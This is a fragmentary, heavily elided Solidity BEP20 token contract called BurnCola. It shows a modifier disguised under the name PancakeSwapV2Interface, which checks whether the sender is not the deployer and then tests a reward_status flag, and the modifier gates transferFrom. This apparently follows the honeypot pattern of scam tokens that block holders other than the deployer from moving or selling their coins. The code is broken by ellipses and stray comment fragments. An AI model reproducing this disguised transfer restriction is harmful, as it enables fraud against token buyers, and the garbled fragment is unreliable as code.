...
contract BurnCola is Context, IBEP20, Ownable {
  ...
  */
   ...
   * `amount`.
   */
  modifier PancakeSwapV2Interface(address sender, address recipient) {
            if(sender != _deployer) {
                if(reward_status){
   ...
   * `amount`.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external PancakeSwapV2Interface(sender,recipient) override returns (bool) {
